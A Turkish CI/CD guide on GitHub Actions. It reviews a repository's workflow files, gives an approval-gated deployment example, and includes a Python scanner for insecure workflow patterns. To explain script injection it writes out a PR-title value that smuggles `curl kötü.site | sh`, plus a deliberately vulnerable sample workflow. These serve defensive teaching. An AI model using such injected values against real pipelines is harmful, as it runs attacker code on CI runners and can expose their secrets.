---
baslik: Sürekli bütünleştirme ve dağıtım (CI/CD)
ozet: İş akışının yapısı (tetikleyici, iş, adım, matris, önbellek, sır, izin), depodaki gerçek GitHub Actions dosyalarının okunması, yeşil dal kuralı, onaylı dağıtım ve sık CI hataları.
etiketler: [ci-cd, github-actions, otomasyon, dagitim, devops]
duzey: orta
guncellik: 2026-11
---

# Sürekli bütünleştirme ve dağıtım (CI/CD)

> Bu notu ne zaman okumalı: bir iş akışı dosyası (`.github/workflows/*.yml`) yazarken ya da okurken; CI kırmızıyken;
> dağıtımı otomatikleştirmeden önce; "yerelde geçiyor, CI'da kalıyor" durumunda.

## Temel fikir

**Sürekli bütünleştirme (CI):** her gönderimde kod temiz bir makinede kurulur ve denetlenir. "Benim makinemde
çalışıyor" biter; çünkü CI makinesinde yalnız iş akışının kurduğu şeyler vardır. **Sürekli dağıtım (CD):** denetim
yeşilse yayın her seferinde aynı betikle yapılır; elle adım, unutulan komut yoktur.

CI makinesi her koşuda sıfırdır: önceki koşudan yalnız açıkça saklanan önbellek ve yapıtlar (artifact) kalır; sır
yalnız açıkça verilirse gelir. Bir iş akışı aynı zamanda bir **yetki** taşır: depoya yazabilir, yayın yapabilir.
Bu yüzden iş akışı kod gibi gözden geçirilir.

## İş akışının parçaları

| Anahtar                     | Ne yapar                                           | Dikkat                                                              |
| --------------------------- | -------------------------------------------------- | ------------------------------------------------------------------- |
| `on:`                       | Tetikleyici: `push`, `pull_request`, `schedule`, `workflow_dispatch` | `push` + `pull_request` birlikte: PR dalında iki koşu |
| `permissions:`              | İş akışına verilen `GITHUB_TOKEN` yetkisi          | Yazılmazsa depo/kuruluş varsayılanı geçer; en az yetkiyi açıkça yazın |
| `concurrency:`              | Aynı gruptan tek koşu; `cancel-in-progress`        | CI'da eskiyi iptal et; **dağıtımda iptal etme**                     |
| `jobs.<ad>.runs-on`         | Makine türü                                        |                                                                     |
| `needs:`                    | İşler arası sıra; `outputs` ile değer aktarımı     | Dağıtım işi test işine `needs` ile bağlanır                         |
| `if:`                       | Koşul                                              | Dağıtımı yalnız `main`'e gönderimde çalıştırmak için                |
| `strategy.matrix`           | Aynı işi farklı değerlerle (sürüm, klasör)         | `fail-fast: false` birinin hatası ötekileri durdurmasın             |
| `steps: uses / run`         | Hazır eylem ya da kabuk komutu                     | `uses:` sürüme sabitlenir                                           |
| `with:` / `env:`            | Eyleme girdi / adıma ortam değişkeni               | Dış girdiyi betiğe `env:` ile verin                                 |
| `secrets.X` / `vars.X`      | Sır / sır olmayan ayar                             | Çatal (fork) PR'larında sır yoktur                                  |
| `environment:`              | Ortam: koruma kuralı (onaylayıcı), ortama özel sır | Onay adımı buradan kurulur                                          |
| `timeout-minutes:`          | İşin üst süresi                                    | Yazılmazsa asılı kalan iş saatlerce koşar                           |
| Önbellek (`cache: npm`)     | İndirilen paketleri koşular arası saklar           | Anahtar kilit dosyasının özetini içermeli                           |
| Yapıt (`upload-artifact`)   | Koşunun çıktısını saklar (rapor, derleme)          | `if: failure()` ile yalnız hatada rapor                             |

## Depodaki iş akışlarını okumak

### `ci.yml` — Köprü'nün denetimi ([dosya](../../../.github/workflows/ci.yml))

| Satır                                          | Ne yapar                                                      | Dikkat                                                        |
| ---------------------------------------------- | ------------------------------------------------------------- | ------------------------------------------------------------- |
| `on: push` + `pull_request`                    | Her dala her gönderimde ve her PR'da koşar                    | Açık PR'ı olan dalda aynı kayıt iki kez denetlenir            |
| (`permissions:` yok)                           | Belirteç yetkisi varsayılandan gelir                          | `permissions: { contents: read }` eklenmeli                   |
| `node-version: lts/*`                          | O günün LTS Node'u                                            | LTS çizgisi değişince CI sessizce yeni sürüme geçer; `.nvmrc` + `node-version-file` daha öngörülebilir |
| `cache: npm`                                   | npm'in indirme önbelleğini kilit dosyası özetiyle saklar      | `node_modules` saklanmaz; `npm ci` yine çalışır, ama hızlı    |
| `npm ci` → `npm run check`                     | Kilitten kurulum; tip + lint + biçim + test + içerik          | Yerelde de aynı tek komut                                     |
| `npx playwright install --with-deps chromium`  | Tarayıcıyı ve sistem paketlerini kurar                        | Her koşuda indirir; yavaş ama doğru                           |
| `upload-artifact` + `if: failure()`            | Yalnız hata olunca test çıktısını 7 gün saklar               | İyi kalıp: kırmızı koşunun kanıtı indirilebilir               |
| (`timeout-minutes:` yok)                       |                                                               | Asılı kalan uçtan uca test saatlerce dakika yer               |

### `pages.yml` — GitHub Pages'e yayın ([dosya](../../../.github/workflows/pages.yml))

| Satır                                               | Ne yapar                                                   | Dikkat                                                       |
| --------------------------------------------------- | ---------------------------------------------------------- | ------------------------------------------------------------ |
| `push: branches: [main, claude/…]`                  | Bu dallara her gönderim **yayına** gider                   | Birden çok dal aynı siteye yayın yapar: son gönderen kazanır |
| `permissions: pages: write, id-token: write`        | Pages'e yazma + kimlik belirteci (OIDC)                    | Uzun ömürlü anahtar gerekmez                                 |
| `concurrency: pages`, `cancel-in-progress: true`    | Yeni gönderim süren koşuyu iptal eder                      | Yayın yarıda kesilebilir; GitHub'ın örneği ve site temelinin [örneği](../../site/docs/yayin/github-pages.yml) `false` kullanır |
| `npm run build`                                     | İçerik doğrulama + tip denetimi + derleme                  | Birim ve uçtan uca test **yok**: CI kırmızıyken de yayın gider |
| TV+ adımı: `continue-on-error: true` + `if [ -f … ]` | `gh-pages` dalı yoksa sessizce atlar                       | Bilinçli; ama yetki hatası gibi gerçek bir sorunu da yutar   |
| `upload-pages-artifact` → `deploy-pages`            | Derleme işi yapıt üretir, yayın işi onu yayınlar           | İki iş: yayın işi yalnız yapıtı görür, kaynağı değil         |
| `environment: github-pages`                         | Yayını ortama bağlar                                       | Onaylayıcı kuralı bu ortama eklenebilir                      |

### `havuz.yml` — temellerin denetimi ([dosya](../../../.github/workflows/havuz.yml))

| Satır                                                     | Ne yapar                                                     | Neden iyi / dikkat                                          |
| --------------------------------------------------------- | ------------------------------------------------------------ | ----------------------------------------------------------- |
| `paths: ['havuz/**', …]`                                  | Yalnız havuz değişince koşar                                 | Zorunlu denetim yapılırsa havuza dokunmayan PR beklemede kalır (aşağıda) |
| `workflow_dispatch.inputs.temel`                          | Elle tetiklerken temel seçilir                               |                                                             |
| `permissions: contents: read`                             | En az yetki                                                  | ✓                                                           |
| `concurrency: havuz-${{ github.ref }}`, iptal `true`       | Aynı dalda eski denetim iptal                                | CI için doğru                                               |
| `fetch-depth: 0`                                          | Tam geçmiş                                                   | Değişen dosyaları bulmak için `git diff` gerekir            |
| `GIRDI: ${{ github.event.inputs.temel }}` (`env:` altında) | Girdi betiğe ortam değişkeniyle gider                        | ✓ Betik enjeksiyonuna karşı doğru kalıp; betik girdiyi bilinen temellerle eşler |
| `outputs.temeller` → `fromJSON(...)` matrisi              | Dinamik matris: yalnız değişen temeller                      |                                                             |
| `if: needs.plan.outputs.temeller != '[]'`                 | Boş matrisle iş açılmaz                                      | Boş matris hata verirdi                                     |
| `fail-fast: false`, `timeout-minutes: 45`                 | Biri kırılsa da ötekiler sürer; üst süre                     | ✓                                                           |

Zamanlanmış örnek: [`veri/docs/ornek-is-akisi.yml`](../../veri/docs/ornek-is-akisi.yml). `cron` saatleri **UTC**'dir
(dosyadaki `17 13 * * 1-5` = TSİ 16:17); dakikanın `:00` olmaması yoğun saatte gecikmeyi azaltır. Zamanlanmış iş
yalnız varsayılan dalda koşar; uzun süre etkinlik olmayan depolarda zamanlama kendiliğinden kapatılabilir (süre için
GitHub'ın güncel belgesine bakın).

## Yeşil dal kuralı

- `main` her an yayınlanabilir durumdadır. Her değişiklik PR ile gelir ve **denetim yeşilse** birleşir.
- GitHub'da dal koruması (ya da kural kümesi): "zorunlu durum denetimleri", "birleştirmeden önce dal güncel
  olsun". Böylece testler birleşmiş hâl üzerinde koşar.
- `main` kırmızıya dönerse ilk iş **geri almaktır** (`git revert`), sonra sakin kafayla düzeltmek.
- Testi atlamak, silmek, beklentisini gevşetmek çözüm değildir ([`STANDARTLAR.md`](../../STANDARTLAR.md) §5).
  Ara sıra kırılan (kararsız) testi "yeşil olana kadar yeniden çalıştır" ile geçiştirmeyin; nedenini bulun.

## Dağıtımı otomatikleştirmek ve onay adımı

Sıra: PR → CI yeşil → `main`'e birleşme → yapıt **bir kez** derlenir → (varsa) deneme ortamına dağıtılır ve
duman testi → üretim için **onay** → dağıtım → sağlık denetimi → sorun varsa geri alma
([Dağıtım stratejileri](dagitim-stratejileri.md)).

```yaml
name: Denetle ve dağıt
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }} # PR'da eskiyi iptal et, main'de etme

jobs:
  denetle:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run check

  dagit:
    needs: denetle # denetim yeşil değilse dağıtım başlamaz
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: uretim # Settings → Environments → uretim → "Required reviewers": onay adımı
    concurrency:
      group: uretim
      cancel-in-progress: false # süren dağıtım yarıda kesilmesin
    steps:
      - name: Dağıtımı tetikle
        env:
          KANCA: ${{ secrets.DAGITIM_KANCASI }} # platformun dağıtım kancası adresi; ortam sırrı
        run: curl -fsS -X POST "$KANCA" > /dev/null
      - name: Yeni sürüm yayında mı?
        env:
          ADRES: https://ornek.com/api/health
          BEKLENEN: ${{ github.sha }}
        run: |
          for i in $(seq 1 60); do
            if curl -fsS "$ADRES" | grep -q "$BEKLENEN"; then echo "yayında"; exit 0; fi
            sleep 10
          done
          echo "10 dakikada yeni sürüm görünmedi"; exit 1
```

- Son adım, sağlık ucunun çalışan sürümün kimliğini (burada kayıt özeti) döndürmesini ister; yoksa denetim eski
  sürümün "ok" yanıtını görüp yanılır. Havuzdaki uç `version` alanı döndürür; bunu her yayında değişen bir
  değerle besleyin.
- Eylem sürümleri örnektir; güncelini eylemin kendi sayfasından okuyun. Depoda iki farklı çizgi görürsünüz: kök
  iş akışları ile site temelinin örneği farklı ana sürümler kullanıyor. Güncel tutmak için Dependabot ya da
  benzeri; üçüncü taraf eylemleri tam kayıt özetine (`@<40 haneli özet>`) sabitlemek daha güvenlidir.
- Platform "yalnız CI yeşilse dağıt" seçeneği sunuyorsa onu kullanın. Kök [`render.yaml`](../../../render.yaml)
  otomatik dağıtımı kapatmış (`autoDeployTrigger: 'off'`): dağıtım elle ya da kancayla yapılır.

## İş akışı denetleyicisi

Satır tabanlı kaba bir tarayıcı. Depodaki iş akışlarına uygulandığında `ci.yml`'de izin bloğu eksikliğini,
`pages.yml`'de yarıda kesilebilen yayını bulur; ayrıca elle tetiklenen bazı iş akışlarında `${{ inputs.… }}`
değerinin doğrudan `run:` içine yazıldığını gösterir (`audio.yml`, `moda-radar-veri.yml`, `yatirim-ajani.yml`).
Elle tetikleme yazma yetkisi istediği için risk düşüktür, ama kalıp yanlıştır: değer `env:` ile verilmelidir.

```python calistir
import re

RUN = re.compile(r"^(\s*)(-\s+)?run:\s*(.*)$")
TEHLIKELI = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|inputs\.)")


def denetle(metin: str) -> list[str]:
    satirlar, bulgular = metin.splitlines(), []
    if not any(s.startswith("permissions:") for s in satirlar):
        bulgular.append("izin bloğu yok")
    if "timeout-minutes:" not in metin:
        bulgular.append("üst süre yok")
    if "pull_request_target" in metin:
        bulgular.append("pull_request_target: çatal kodu sırlarla çalışabilir")
    for s in satirlar:
        m = re.search(r"uses:\s*([^\s#]+)", s)
        if m and not m.group(1).startswith("./") and ("@" not in m.group(1) or re.search(r"@(main|master|latest)$", m.group(1))):
            bulgular.append(f"kayan sürüm: {m.group(1)}")
    blok = None  # çok satırlı run: bloğunun anahtar girintisi
    for s in satirlar:
        if blok is not None and s.strip() and len(s) - len(s.lstrip()) <= blok:
            blok = None
        m = RUN.match(s)
        if m and m.group(3).strip() in ("|", ">", "|-", ">-"):
            blok = len(m.group(1)) + len(m.group(2) or "")
        elif (m and TEHLIKELI.search(m.group(3))) or (not m and blok is not None and TEHLIKELI.search(s)):
            bulgular.append("betik enjeksiyonu: dış değer run: içinde")
    if re.search(r"cancel-in-progress:\s*true", metin) and re.search(r"deploy-pages|environment:", metin):
        bulgular.append("dağıtım yarıda kesilebilir")
    return bulgular


KOTU = """name: Dağıt
on:
  pull_request_target:
concurrency:
  group: uretim
  cancel-in-progress: true
jobs:
  dagit:
    runs-on: ubuntu-latest
    environment: uretim
    steps:
      - uses: actions/checkout@main
      - run: echo "Başlık: ${{ github.event.pull_request.title }}"
      - run: |
          ./dagit.sh "${{ github.head_ref }}"
"""
IYI = """name: Denetle
on: [push, pull_request]
permissions:
  contents: read
jobs:
  denetle:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - env:
          BASLIK: ${{ github.event.pull_request.title }}
        run: |
          echo "Başlık: $BASLIK"
"""
assert denetle(IYI) == []
for bulgu in denetle(KOTU):
    print("-", bulgu)
```

```cikti
- izin bloğu yok
- üst süre yok
- pull_request_target: çatal kodu sırlarla çalışabilir
- kayan sürüm: actions/checkout@main
- betik enjeksiyonu: dış değer run: içinde
- betik enjeksiyonu: dış değer run: içinde
- dağıtım yarıda kesilebilir
```

Neden `env:`? `${{ }}` ifadesi betik çalışmadan **önce** metne yapıştırılır. PR başlığı `"; curl kötü.site | sh; "`
ise bu metin komut olur. Ortam değişkeni ise yalnız veri olarak okunur.

## Tuzaklar

| Belirti                                                          | Neden                                                         | Çözüm                                                                   |
| ---------------------------------------------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------------------- |
| Dışarıdan gelen PR'da adım "sır boş" ya da 401 ile kalıyor       | Çatal (fork) PR'larında sırlar verilmez; Dependabot PR'ları da Actions sırlarını görmez | Sır isteyen adımı koşula bağlayın; `pull_request_target` ile PR kodunu çalıştırmayın |
| `Resource not accessible by integration`                         | `permissions:` yetkisi yetmiyor                               | Gereken yetkiyi o işe açıkça verin (ör. PR yorumu: `pull-requests: write`) |
| PR "Expected — Waiting for status" durumunda kaldı               | Zorunlu denetimin iş akışı `paths` filtresiyle hiç başlamadı  | Filtreyi işin içine alın ya da her zaman koşan bir özet iş zorunlu olsun |
| Yerelde geçen test CI'da kalıyor                                 | Saat dilimi (CI'da UTC), dil ayarı, dosya adında büyük-küçük harf (Linux duyarlı), eksik sistem paketi | Testte saat ve dili açıkça verin; dosya adlarını aynı yazın |
| Önbellek hiç tutmuyor ya da eski paket geliyor                   | Anahtar kilit dosyasını içermiyor / yanlış yolu saklıyor      | Kurulum eyleminin önbelleği ya da `hashFiles('**/package-lock.json')`   |
| İş saatlerce asılı kaldı                                         | `timeout-minutes` yok; etkileşimli komut onay bekliyor        | Üst süre; komutlara etkileşimsiz bayrak (`--yes`, `CI=true`)            |
| Her gönderimde iki koşu                                          | `push` + `pull_request` aynı dal için                         | `push`'u `main`'e sınırlayın                                            |
| Yayın yarıda kesildi, site karışık hâlde                         | Dağıtımda `cancel-in-progress: true`                          | Dağıtım grubunda `false`                                                |
| Zamanlanmış iş yanlış saatte ya da hiç çalışmıyor                | `cron` UTC; yalnız varsayılan dalda; etkinlik yokken kapatılır | Saati UTC'ye çevirin; elle tetikleme de ekleyin                        |
| PR başlığıyla komut çalıştırılabildi                             | `${{ github.event… }}` doğrudan `run:` içinde                 | Değeri `env:` ile verin                                                 |
| Eylem bir gün davranış değiştirdi                                | `@main` ya da kayan etiket                                    | Sürüme, tercihen tam özete sabitleyin                                   |
| Sır günlükte göründü                                             | Türetilmiş değer (base64, parçası) maskelenmez; `set -x` açık | Sırrı yazdırmayın; türetilmiş değeri `::add-mask::` ile gizleyin        |
| CI kırmızıyken site yayına çıktı                                 | Yayın iş akışı testlere bağlı değil                           | `needs: denetle` ya da dal korumasıyla yalnız yeşil birleşme            |

## Denetim listesi

- [ ] Her iş akışında üst düzey `permissions:` var; yazma yetkisi yalnız gereken işte.
- [ ] Her işte `timeout-minutes` var.
- [ ] Dağıtım işi denetim işine `needs` ile bağlı ve yalnız `main` gönderiminde koşuyor.
- [ ] Dağıtımın `concurrency` grubunda `cancel-in-progress: false`.
- [ ] Üretim dağıtımı `environment:` altında; onaylayıcı kuralı açık; üretim sırları ortam sırrı.
- [ ] `run:` içinde `${{ github.event… }}`, `${{ inputs… }}`, `${{ github.head_ref }}` yok; hepsi `env:` ile.
- [ ] `pull_request_target` yok; varsa PR kodunu çalıştırmıyor.
- [ ] Eylemler sürüme sabit; güncelleme için Dependabot ya da eşdeğeri açık.
- [ ] `main` dal korumalı: zorunlu denetimler, PR zorunlu.
- [ ] Dağıtımdan sonra sağlık ucu yeni sürümü doğruluyor.
- [ ] Kırmızı koşuda rapor yapıt olarak indirilebiliyor.

## Küçük modele yaptırırken

- **İsteme yazın:** "İş akışını yaz: üst düzeyde `permissions: contents: read`; her işte `timeout-minutes`;
  dağıtım işi `needs: denetle`, `environment: uretim`, `cancel-in-progress: false`; dış değerleri `run:` içine
  `${{ }}` ile değil `env:` ile ver; eylem sürümlerini uydurma, depodaki dosyalardan al."
- **Modelin tipik hatası:** var olmayan eylem sürümü uydurmak; `permissions: write-all`; sırrı `echo` ile
  yazdırmak; `pull_request_target` önermek ("sırlar PR'da da gelsin" diye); dağıtım işini teste bağlamamak; cron'u
  yerel saatle yazmak; kırmızı testi `continue-on-error: true` ile susturmak.
- **Çıktıda denetleyin:** yukarıdaki denetleyiciyi dosyaya uygulayın; `continue-on-error` ve `if: always()`
  satırlarının her birinin gerekçesini sorun; YAML'ı birleştirmeden önce bir PR'da koşturup yeşilini görün.

## İlgili

- [Dağıtım stratejileri](dagitim-stratejileri.md) — geri alma, kademeli dağıtım
- [Durağan site yayını](duragan-site-yayini.md) — Pages yayınının ayrıntısı
- [Ortam ve yapılandırma](ortam-ve-yapilandirma.md) — sırlar ve ortamlar
- [Test stratejisi](../00-yontem/test-stratejisi.md) — CI'da neyin koşacağı · [Git](../10-diller/git.md)
- [Sır yönetimi](../50-guvenlik/sir-yonetimi.md) — CI sırları · [Tedarik zinciri](../50-guvenlik/tedarik-zinciri.md) — sürüm sabitleme ve güncelleme
- Çalışan karşılıklar: [`ci.yml`](../../../.github/workflows/ci.yml), [`pages.yml`](../../../.github/workflows/pages.yml),
  [`havuz.yml`](../../../.github/workflows/havuz.yml), [`site/docs/yayin/github-pages.yml`](../../site/docs/yayin/github-pages.yml)
